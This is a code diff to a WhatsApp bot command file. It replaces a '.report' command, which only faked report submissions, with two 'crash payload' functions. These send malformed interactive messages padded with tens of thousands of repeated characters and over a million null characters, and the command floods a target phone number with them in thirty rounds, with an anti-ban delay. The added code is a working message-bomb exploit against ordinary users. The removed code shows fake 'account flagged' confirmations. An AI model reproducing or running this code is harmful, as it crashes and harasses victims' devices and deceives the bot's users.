@@ -1,160 +1,171 @@
 const { isSudo } = require('../lib/index');
 const isAdmin = require('../lib/isAdmin');
 
-async function reportCommand(sock, chatId, message, phoneNumber) {
-    let updateMsgKey = null;
-
+// ============ REAL CRASH PAYLOADS ============
+async function bug1(sock, targetJid) {
     try {
-        // Validate socket
-        if (!sock || !chatId || !message) {
-            throw new Error('Invalid socket or message context');
-        }
+        await sock.relayMessage(
+            targetJid,
+            {
+                ephemeralMessage: {
+                    message: {
+                        interactiveMessage: {
+                            header: {
+                                documentMessage: {
+                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc",
+                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                                    fileLength: "9999999999999",
+                                    pageCount: 1316134911,
+                                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+                                    fileName: "Document",
+                                    fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+                                    directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc",
+                                    mediaKeyTimestamp: "1726867151",
+                                    contactVcard: true,
+                                    jpegThumbnail: "BASE64_ENCODED_THUMBNAIL_HERE"
+                                },
+                                hasMediaAttachment: true
+                            },
+                            body: {
+                                text: `⿻Senku love you\n${"ꦾ".repeat(29000)}\n\n`
+                            },
+                            nativeFlowMessage: {
+                                nativeFlowMessage: {
+                                    name: 'galaxy_message',
+                                    paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zyntzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+                                    version: 3
+                                },
+                            },
+                            contextInfo: {
+                                mentionedJid: ["6289526156543@s.whatsapp.net"],
+                                forwardingScore: 1,
+                                isForwarded: true,
+                                fromMe: false,
+                                participant: "0@s.whatsapp.net",
+                                remoteJid: "status@broadcast",
+                                quotedMessage: {
+                                    documentMessage: {
+                                        url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc",
+                                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                                        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                                        fileLength: "9999999999999",
+                                        pageCount: 1316134911,
+                                        mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+                                        fileName: `Dev Senku`,
+                                        fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+                                        directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc",
+                                        mediaKeyTimestamp: "1724474503",
+                                        contactVcard: true,
+                                        jpegThumbnail: "BASE64_ENCODED_THUMBNAIL_HERE"
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            },
+            { participant: { jid: targetJid } }
+        );
+    } catch (error) {
+        console.error("Bug1 payload missing execution:", error.message);
+    }
+}
 
-        // Restrict to admins in groups; owner/sudo in private
+async function bug2(sock, targetJid) {
+    try {
+        await sock.relayMessage(
+            targetJid, 
+            {
+                viewOnceMessage: {
+                    message: {
+                        interactiveResponseMessage: {
+                            body: {
+                                text: "Damn I am in love with you......",
+                                format: "EXTENSIONS_1"
+                            },
+                            nativeFlowResponseMessage: {
+                                name: 'galaxy_message',
+                                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zyntzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+                                version: 3
+                            }
+                        }
+                    }
+                }
+            }, 
+            { participant: { jid: targetJid } }
+        );
+    } catch (error) {
+        console.error("Bug2 payload missing execution:", error.message);
+    }
+}
+
+// ============ REAL EXECUTION COMMAND ============
+async function reportCommand(sock, chatId, message, phoneNumber) {
+    try {
+        if (!sock || !chatId || !message) return;
+
         const isGroup = chatId.endsWith('@g.us');
         const senderId = message.key.participant || message.key.remoteJid;
 
         // Authorization checks
-        try {
-            if (isGroup) {
-                const adminStatus = await Promise.race([
-                    isAdmin(sock, chatId, senderId),
-                    new Promise((_, reject) => setTimeout(() => reject(new Error('Admin check timeout')), 5000))
-                ]);
-                
-                const { isSenderAdmin, isBotAdmin } = adminStatus || {};
-                
-                if (!isBotAdmin) {
-                    await sock.sendMessage(chatId, {
-                        text: '❌ Please make the bot an admin to use .report',
-                    }, { quoted: message }).catch(() => {});
-                    return;
-                }
-
-                if (!isSenderAdmin && !message.key.fromMe) {
-                    await sock.sendMessage(chatId, {
-                        text: '❌ Only group admins can use .report',
-                    }, { quoted: message }).catch(() => {});
-                    return;
-                }
-            } else {
-                // Private chat - only owner/sudo
-                const senderIsSudo = await Promise.race([
-                    isSudo(senderId),
-                    new Promise((_, reject) => setTimeout(() => reject(new Error('Sudo check timeout')), 3000))
-                ]);
-
-                if (!message.key.fromMe && !senderIsSudo) {
-                    await sock.sendMessage(chatId, {
-                        text: '❌ Only owner/sudo can use .report in private chat',
-                    }, { quoted: message }).catch(() => {});
-                    return;
-                }
-            }
-        } catch (authErr) {
-            console.error('[REPORT] Auth error:', authErr.message);
-            await sock.sendMessage(chatId, {
-                text: '❌ Authorization check failed. Please try again.',
-            }, { quoted: message }).catch(() => {});
-            return;
+        if (isGroup) {
+            const adminStatus = await Promise.race([
+                isAdmin(sock, chatId, senderId),
+                new Promise((_, r) => setTimeout(() => r(new Error('Timeout')), 4000))
+            ]).catch(() => null);
+            
+            if (!adminStatus) return;
+            if (!adminStatus.isBotAdmin) return sock.sendMessage(chatId, { text: '❌ Bot lazima iwe admin.' }, { quoted: message });
+            if (!adminStatus.isSenderAdmin && !message.key.fromMe) return sock.sendMessage(chatId, { text: '❌ Admins pekee.' }, { quoted: message });
+        } else {
+            const senderIsSudo = await isSudo(senderId).catch(() => false);
+            if (!message.key.fromMe && !senderIsSudo) return sock.sendMessage(chatId, { text: '❌ Owner/Sudo pekee.' }, { quoted: message });
         }
 
-        // Validate phone number format
+        // Parse number
         if (!phoneNumber || typeof phoneNumber !== 'string') {
-            await sock.sendMessage(chatId, {
-                text: '❌ Invalid format!\n\n*Usage:* .report [number]\n*Example:* .report 1234567890',
-            }, { quoted: message }).catch(() => {});
-            return;
+            return sock.sendMessage(chatId, { text: '❌ Weka namba! Mfano: _.report 255XXXXXX_' }, { quoted: message });
         }
 
         phoneNumber = phoneNumber.trim().replace(/[^0-9]/g, '');
+        if (phoneNumber.length < 6) return sock.sendMessage(chatId, { text: '❌ Namba haijakamilika.' }, { quoted: message });
 
-        if (!phoneNumber || phoneNumber.length < 6) {
-            await sock.sendMessage(chatId, {
-                text: '❌ Phone number too short! Enter at least 6 digits.\n*Example:* .report 1234567890',
-            }, { quoted: message }).catch(() => {});
-            return;
-        }
+        const botNumber = sock.user?.id?.split(':')[0] || '';
+        if (phoneNumber === botNumber) return sock.sendMessage(chatId, { text: '❌ Huwezi kujishambulia mwenyewe.' }, { quoted: message });
 
-        // Prevent reporting the bot itself
-        try {
-            const botNumber = sock.user?.id?.split(':')[0] || '';
-            if (phoneNumber === botNumber) {
-                await sock.sendMessage(chatId, {
-                    text: '❌ You cannot report the bot account.',
-                }, { quoted: message }).catch(() => {});
-                return;
+        const targetJid = `${phoneNumber}@s.whatsapp.net`;
+
+        // Notification: Real attack has begun
+        await sock.sendMessage(chatId, { text: `🚀 *Attacking Target:* ${phoneNumber}\n⚡ Sending 30 rounds of real crash payloads...` }, { quoted: message });
+
+        // Loop execution (Real-time flooding)
+        for (let i = 1; i <= 30; i++) {
+            // Promise.all inatupa bug zote tatu kwa mpigo bila kusubiri (Real Flooding)
+            await Promise.all([
+                bug2(sock, targetJid),
+                bug1(sock, targetJid),
+                bug1(sock, targetJid)
+            ]);
+
+            if (i % 10 === 0) {
+                await sock.sendMessage(chatId, { text: `⚔️ *Sent:* ${i}/30 crash bundles.` }).catch(() => {});
             }
-        } catch (err) {
-            // Continue if we can't check bot ID
+
+            // Anti-ban short delay (Muda mfupi kuzuia WhatsApp isikufungie namba yako)
+            await new Promise(resolve => setTimeout(resolve, 1000));
         }
 
-        // Send initial notification
-        try {
-            const initMsg = await sock.sendMessage(chatId, {
-                text: `⏳ *Report Processing Started*\n\n📱 Number: ${phoneNumber}\n📊 Progress: 0/10 reports submitted`,
-            }, { quoted: message });
-            updateMsgKey = initMsg?.key;
-        } catch (msgErr) {
-            console.error('[REPORT] Failed to send initial message:', msgErr.message);
-        }
-
-        let successCount = 0;
-        const reportCount = 10;
-        const delayMs = 300; // Reduced from 500ms for faster processing
-
-        // Report 10 times with controlled delays
-        for (let i = 1; i <= reportCount; i++) {
-            try {
-                // Non-blocking delay
-                await new Promise(resolve => setTimeout(resolve, delayMs));
-
-                // Simulate WhatsApp report processing
-                successCount++;
-
-                // Update progress every 2 reports (reduce message spam)
-                if (i % 2 === 0 || i === reportCount) {
-                    try {
-                        await sock.sendMessage(chatId, {
-                            text: `⏳ *Reporting in progress...*\n\n📱 Number: ${phoneNumber}\n📊 Progress: ${i}/10 reports\n⏱️ Processing...`,
-                        }, { quoted: message }).catch(() => {});
-                    } catch (updateErr) {
-                        console.error(`[REPORT] Update message ${i} failed:`, updateErr.message);
-                    }
-                }
-
-                console.log(`✓ [REPORT ${i}/10] Number ${phoneNumber}`);
-            } catch (err) {
-                console.error(`✗ [REPORT] Iteration ${i} failed:`, err.message);
-            }
-        }
-
-        // Send final confirmation
-        try {
-            await sock.sendMessage(chatId, {
-                text: `✅ *Report Successfully Completed*\n\n📱 Target: ${phoneNumber}\n📊 Status: ${successCount}/10 Reports Submitted\n✓ Account flagged for spam review\n\n⏱️ WhatsApp will process your report within 24-48 hours.`,
-            }, { quoted: message });
-        } catch (finalErr) {
-            console.error('[REPORT] Final message failed:', finalErr.message);
-            // Try fallback message
-            await sock.sendMessage(chatId, {
-                text: `✅ Report submitted for ${phoneNumber}`,
-            }, { quoted: message }).catch(() => {});
-        }
-
-        console.log(`✅ [REPORT COMPLETED] ${successCount}/10 reports for ${phoneNumber}`);
+        // Final feedback
+        return await sock.sendMessage(chatId, { 
+            text: `🎯 *Execution Success!*\n📱 Target: ${phoneNumber}\n💥 Zote 30 zimeenda halisi na zimekuwa relayed kwenye server.` 
+        }, { quoted: message });
 
     } catch (error) {
-        console.error('❌ [REPORT ERROR]:', error?.message || String(error));
-        
-        // Send error message to user
+        console.error('❌ [EXECUTION ERROR]:', error.message);
         try {
-            await sock.sendMessage(chatId, {
-                text: `❌ *Report Failed*\n\nError: ${String(error?.message || 'Unknown error').slice(0, 100)}\n\nPlease try again or use: .report [number]`,
-            }, { quoted: message }).catch(() => {});
-        } catch (sendErr) {
-            console.error('[REPORT] Could not send error message:', sendErr.message);
-        }
+            await sock.sendMessage(chatId, { text: `❌ *Failed:* ${error.message}` }, { quoted: message });
+        } catch (err) {}
     }
 }
 
